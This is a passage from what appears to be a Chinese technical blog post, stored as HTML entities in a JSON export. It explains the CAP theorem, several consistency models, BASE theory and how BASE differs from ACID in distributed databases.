#x6027;&#x5730;&#x5B8C;&#x6210;&#x9884;&#x5B9A;&#x7684;&#x5DE5;&#x4F5C;&#x3002;</p>\n</li>\n<li><p><strong>&#x9694;&#x79BB;&#x6027;&#xFF1A;</strong>&#x6570;&#x636E;&#x5E93;&#x5141;&#x8BB8;&#x591A;&#x4E2A;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x540C;&#x65F6;&#x5BF9;&#x9F50;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x548C;&#x4FEE;&#x6539;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x9694;&#x79BB;&#x6027;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x591A;&#x4E2A;&#x4E8B;&#x52A1;&#x5E76;&#x53D1;&#x6267;&#x884C;&#x65F6;&#x7531;&#x4E8E;&#x4EA4;&#x53C9;&#x6267;&#x884C;&#x800C;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x5206;&#x4E3A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#xFF0C;&#x5305;&#x62EC;&#x8BFB;&#x672A;&#x63D0;&#x4EA4;&#xFF08;Read uncommitted&#xFF09;&#x3001;&#x8BFB;&#x63D0;&#x4EA4;&#xFF08;read committed&#xFF09;&#x3001;&#x53EF;&#x91CD;&#x590D;&#x8BFB;&#xFF08;repeatable read&#xFF09;&#x548C;&#x4E32;&#x884C;&#x5316;&#xFF08;Serializable&#xFF09;&#x3002;</p>\n</li>\n<li><p><strong>&#x6301;&#x4E45;&#x6027;&#xFF1A;</strong>&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x4FEE;&#x6539;&#x5C31;&#x662F;&#x6C38;&#x4E45;&#x7684;&#xFF0C;&#x5373;&#x4FBF;&#x7CFB;&#x7EDF;&#x6545;&#x969C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4E22;&#x5931;&#x3002;</p>\n</li>\n</ul>\n<p>ACID&#x662F;&#x4F20;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x5E38;&#x7528;&#x7684;&#x8BBE;&#x8BA1;&#x7406;&#x5FF5;, &#x8FFD;&#x6C42;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x3002;BASE&#x652F;&#x6301;&#x7684;&#x662F;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x51FA;&#x901A;&#x8FC7;&#x727A;&#x7272;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x83B7;&#x5F97;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3002;</p>\n<p><strong>ACID&#x548C;BASE&#x4EE3;&#x8868;&#x4E86;&#x4E24;&#x79CD;&#x622A;&#x7136;&#x76F8;&#x53CD;&#x7684;&#x8BBE;&#x8BA1;&#x54F2;&#x5B66;&#xFF0C;&#x5206;&#x5904;&#x3010;&#x4E00;&#x81F4;&#x6027;-&#x53EF;&#x7528;&#x6027;&#x3011;&#x5206;&#x5E03;&#x56FE;&#x8C31;&#x7684;&#x4E24;&#x6781;&#x3002;</strong></p>\n","excerpt":"<h3 id=\"CAP&#x539F;&#x7406;\"><a href=\"#CAP&#x539F;&#x7406;\" class=\"headerlink\" title=\"CAP&#x539F;&#x7406;\"></a>CAP&#x539F;&#x7406;</h3><p>&#x5728;&#x7406;&#x8BBA;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x4E2D;&#xFF0C;CAP&#x5B9A;&#x7406;&#xFF08;CAP theorem&#xFF09;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4F5C;&#x5E03;&#x9C81;&#x5C14;&#x5B9A;&#x7406;&#xFF08;Brewer&#x2019;s theorem&#xFF09;&#xFF0C;&#x5B83;&#x6307;&#x51FA;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x4E09;&#x70B9;&#xFF1A;</p>\n<ul>\n<li><p><strong>&#x4E00;&#x81F4;&#x6027;&#xFF08;Consistence&#xFF09;</strong><br>&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x662F;&#x5426;&#x540C;&#x6837;&#x7684;&#x503C;&#x3002;&#xFF08;&#x7B49;&#x540C;&#x4E8E;&#x6240;&#x6709;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x4EFD;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x526F;&#x672C;&#xFF09;</p>\n</li>\n<li><p><strong>&#x53EF;&#x7528;&#x6027;&#xFF08;Availability&#xFF09;</strong><br>&#x96C6;&#x7FA4;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x8282;&#x70B9;&#x540E;&#xFF0C;&#x662F;&#x5426;&#x8FD8;&#x80FD;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x3002;&#xFF08;&#x5BF9;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x5177;&#x5907;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF09;</p>\n</li>\n<li><p><strong>&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#xFF08;Partition tolerance&#xFF09;</strong><br>&#x5B9E;&#x9645;&#x4E2D;&#x901A;&#x4FE1;&#x4EA7;&#x751F;&#x5EF6;&#x65F6;&#x3002;&#x7CFB;&#x7EDF;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x5728;&#x65F6;&#x9650;&#x5185;&#x8FBE;&#x6210;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53D1;&#x751F;&#x4E86;&#x5206;&#x533A;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5FC5;&#x987B;&#x5C31;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x5728;C&#x70B9;&#x548C;A&#x70B9;&#x4E4B;&#x95F4;&#x505A;&#x51FA;&#x9009;&#x62E9;&#x3002;</p>\n</li>\n</ul>\n<p>CAP&#x539F;&#x7406;&#x6307;&#x7684;&#x662F;&#xFF0C;CAP&#x7684;&#x4E09;&#x4E2A;&#x8981;&#x7D20;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E24;&#x70B9;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x4E09;&#x8005;&#x517C;&#x987E;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x505A;&#x51FA;&#x53D6;&#x820D;&#x3002;&#x800C;&#x5BF9;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#x662F;&#x57FA;&#x672C;&#x8981;&#x6C42;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x4EF7;&#x503C;&#x3002;</p>\n<p>&#x56E0;&#x6B64;&#x8BBE;&#x8BA1;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x53EF;&#x7528;&#x6027;&#x4E4B;&#x95F4;&#x53D6;&#x4E00;&#x4E2A;&#x5E73;&#x8861;&#x3002;<strong>&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;web&#x5E94;&#x7528;&#xFF0C;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#x800C;&#x6362;&#x53D6;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x662F;&#x76EE;&#x524D;&#x591A;&#x6570;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x7684;&#x65B9;&#x5411;&#x3002;</strong></p>","more":"<p>&#x5F53;&#x7136;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5B8C;&#x5168;&#x4E0D;&#x7BA1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x53EA;&#x662F;&#x4E0D;&#x518D;&#x8981;&#x6C42;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x8981;&#x7CFB;&#x7EDF;&#x80FD;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x5373;&#x53EF;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x5BA2;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF0C;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5BF9;&#x7528;&#x6237;&#x900F;&#x660E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4FDD;&#x969C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x3002;&#x901A;&#x5E38;&#x662F;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x591A;&#x4EFD;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x6765;&#x5B9E;&#x73B0;&#x7CFB;&#x7EDF;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x548C;&#x6570;&#x636E;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#xFF0C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5219;&#x53D6;&#x51B3;&#x4E8E;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\"><a href=\"#&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\"></a>&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;</h3><h4 id=\"&#x5F3A;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x5F3A;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x5F3A;&#x4E00;&#x81F4;&#x6027;\"></a>&#x5F3A;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x5F53;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x4EFB;&#x4F55;&#x591A;&#x4E2A;&#x540E;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x79CD;&#x662F;&#x5BF9;&#x7528;&#x6237;&#x6700;&#x53CB;&#x597D;&#x7684;&#xFF0C;&#x5C31;&#x662F;&#x7528;&#x6237;&#x4E0A;&#x4E00;&#x6B21;&#x5199;&#x4EC0;&#x4E48;&#xFF0C;&#x4E0B;&#x4E00;&#x6B21;&#x5C31;&#x4FDD;&#x8BC1;&#x80FD;&#x8BFB;&#x5230;&#x4EC0;&#x4E48;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x5BF9;&#x6027;&#x80FD;&#x5F71;&#x54CD;&#x8F83;&#x5927;&#x3002;</p>\n<h4 id=\"&#x5F31;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x5F31;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x5F31;&#x4E00;&#x81F4;&#x6027;\"></a>&#x5F31;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x7CFB;&#x7EDF;&#x5E76;&#x4E0D;&#x4FDD;&#x8BC1;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x7CFB;&#x7EDF;&#x5728;&#x6570;&#x636E;&#x5199;&#x5165;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x627F;&#x8BFA;&#x7ACB;&#x5373;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x6700;&#x65B0;&#x5199;&#x5165;&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5177;&#x4F53;&#x7684;&#x627F;&#x8BFA;&#x591A;&#x4E45;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x3002;&#x4F46;&#x4F1A;&#x5C3D;&#x53EF;&#x80FD;&#x4FDD;&#x8BC1;&#x5728;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x7EA7;&#x522B;&#xFF08;&#x6BD4;&#x5982;&#x79D2;&#x7EA7;&#x522B;&#xFF09;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x6570;&#x636E;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x6027;&#x72B6;&#x6001;&#x3002;</p>\n<h4 id=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\"></a>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5728;&#x6CA1;&#x6709;&#x540E;&#x7EED;&#x66F4;&#x65B0;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x6700;&#x7EC8;&#x8FD4;&#x56DE;&#x4E0A;&#x4E00;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x7684;&#x503C;&#x3002;&#x5728;&#x6CA1;&#x6709;&#x6545;&#x969C;&#x53D1;&#x751F;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x4E0D;&#x4E00;&#x81F4;&#x7A97;&#x53E3;&#x7684;&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x53D7;&#x901A;&#x4FE1;&#x5EF6;&#x8FDF;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x548C;&#x590D;&#x5236;&#x526F;&#x672C;&#x7684;&#x4E2A;&#x6570;&#x5F71;&#x54CD;&#x3002;DNS&#x662F;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7CFB;&#x7EDF;&#x3002;</p>\n<h4 id=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\"><a href=\"#&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\" class=\"headerlink\" title=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\"></a>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;</h4><ul>\n<li><strong>&#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5982;&#x679C;A&#x8FDB;&#x7A0B;&#x5728;&#x66F4;&#x65B0;&#x4E4B;&#x540E;&#x5411;B&#x8FDB;&#x7A0B;&#x901A;&#x77E5;&#x66F4;&#x65B0;&#x7684;&#x5B8C;&#x6210;&#xFF0C;&#x90A3;&#x4E48;B&#x7684;&#x8BBF;&#x95EE;&#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;&#x66F4;&#x65B0;&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x7684;C&#x8FDB;&#x7A0B;&#x5C06;&#x4F1A;&#x9075;&#x5FAA;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x89C4;&#x5219;&#x3002;</li>\n<li>&#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x603B;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002;</li>\n<li><strong>&#x4F1A;&#x8BDD;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x8FDB;&#x7A0B;&#x5728;&#x8BBF;&#x95EE;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x540C;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x8BE5;&#x8FDB;&#x7A0B;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x3002;</li>\n<li><strong>&#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5DF2;&#x7ECF;&#x8BFB;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x8BFB;&#x53D6;&#x5230;&#x8BE5;&#x503C;&#x4EE5;&#x524D;&#x7684;&#x4EFB;&#x4F55;&#x503C;&#x3002;</li>\n<li><strong>&#x5355;&#x8C03;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E32;&#x884C;&#x5316;&#x3002;</li>\n</ul>\n<p>&#x4E0A;&#x8FF0;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#xFF0C;&#x4F8B;&#x5982;&#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x53EF;&#x4EE5;&#x7EC4;&#x5408;&#x5B9E;&#x73B0;&#x3002;&#x5E76;&#x4E14;&#x4ECE;&#x5B9E;&#x8DF5;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#xFF0C;&#x8FD9;&#x4E24;&#x8005;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x8BFB;&#x53D6;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684; &#x6570;&#x636E;&#xFF0C;&#x548C;&#x4E00;&#x65E6;&#x8BFB;&#x53D6;&#x5230;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x4E0D;&#x4F1A;&#x518D;&#x8BFB;&#x53D6;&#x65E7;&#x7248;&#x672C;&#xFF0C;&#x5BF9;&#x4E8E;&#x6B64;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x5C11;&#x5F88;&#x591A;&#x989D;&#x5916;&#x7684;&#x70E6;&#x607C;&#x3002;</p>\n<hr>\n<h3 id=\"BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\"><a href=\"#BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\" class=\"headerlink\" title=\"BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\"></a>BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;</h3><p><strong><em>BASE&#x7406;&#x8BBA;&#x662F;&#x5BF9;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;</em></strong>&#xFF0C;&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF08;Strong Consistency&#xFF0C;CAP&#x7684;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x662F;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF09;&#xFF0C;&#x4F46;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x9002;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08;Eventual Consitency&#xFF09;&#x3002;<strong>Redis&#x7B49;&#x4F17;&#x591A;&#x7CFB;&#x7EDF;&#x6784;&#x5EFA;&#x4E8E;&#x8FD9;&#x4E2A;&#x7406;&#x8BBA;&#x4E4B;&#x4E0A;&#x3002;</strong></p>\n<ul>\n<li><p><strong>&#x57FA;&#x672C;&#x53EF;&#x7528;&#xFF08;Basically Available&#xFF09;</strong><br>&#x57FA;&#x672C;&#x53EF;&#x7528;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5728;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5141;&#x8BB8;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x5373;&#x4FDD;&#x8BC1;&#x6838;&#x5FC3;&#x53EF;&#x7528;&#x3002;<br>&#x7535;&#x5546;&#x5927;&#x4FC3;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x8BBF;&#x95EE;&#x91CF;&#x6FC0;&#x589E;&#xFF0C;&#x90E8;&#x5206;&#x7528;&#x6237;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x5F15;&#x5BFC;&#x5230;&#x964D;&#x7EA7;&#x9875;&#x9762;&#xFF0C;&#x670D;&#x52A1;&#x5C42;&#x4E5F;&#x53EF;&#x80FD;&#x53EA;&#x63D0;&#x4F9B;&#x964D;&#x7EA7;&#x670D;&#x52A1;&#x3002;&#x8FD9;&#x5C31;&#x662F;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#x7684;&#x4F53;&#x73B0;&#x3002;</p>\n</li>\n<li><p><strong>&#x8F6F;&#x72B6;&#x6001;&#xFF08; Soft State&#xFF09;</strong><br>&#x8F6F;&#x72B6;&#x6001;&#x662F;&#x6307;&#x5141;&#x8BB8;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#xFF0C;&#x800C;&#x8BE5;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x53EF;&#x7528;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x4E2D;&#x4E00;&#x822C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x81F3;&#x5C11;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;&#x526F;&#x672C;&#xFF0C;&#x5141;&#x8BB8;&#x4E0D;&#x540C;&#x8282;&#x70B9;&#x95F4;&#x526F;&#x672C;&#x540C;&#x6B65;&#x7684;&#x5EF6;&#x65F6;&#x5C31;&#x662F;&#x8F6F;&#x72B6;&#x6001;&#x7684;&#x4F53;&#x73B0;&#x3002;mysql replication&#x7684;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x4F53;&#x73B0;&#x3002;</p>\n</li>\n<li><p><strong>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08; Eventual Consistency&#xFF09;</strong><br>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x526F;&#x672C;&#x7ECF;&#x8FC7;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x76F8;&#x53CD;&#xFF0C;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<h3 id=\"BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\"><a href=\"#BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\" class=\"headerlink\" title=\"BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\"></a>BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;</h3><p>ACID&#xFF0C;&#x662F;&#x6307;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF08;DBMS&#xFF09;&#x5728;&#x5199;&#x5165;/&#x66F4;&#x65B0;&#x8D44;&#x6599;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E3A;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x662F;&#x6B63;&#x786E;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6240;&#x5FC5;&#x987B;&#x5177;&#x5907;&#x7684;&#x56DB;&#x4E2A;&#x7279;&#x6027;&#xFF1A;&#x539F;&#x5B50;&#x6027;&#xFF08;atomicity&#xFF0C;&#x6216;&#x79F0;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x6027;&#xFF09;&#x3001;&#x4E00;&#x81F4;&#x6027;&#xFF08;consistency&#xFF09;&#x3001;&#x9694;&#x79BB;&#x6027;&#xFF08;isolation&#xFF0C;&#x53C8;&#x79F0;&#x72EC;&#x7ACB;&#x6027;&#xFF09;&#x3001;&#x6301;&#x4E45;&#x6027;&#xFF08;durability&#x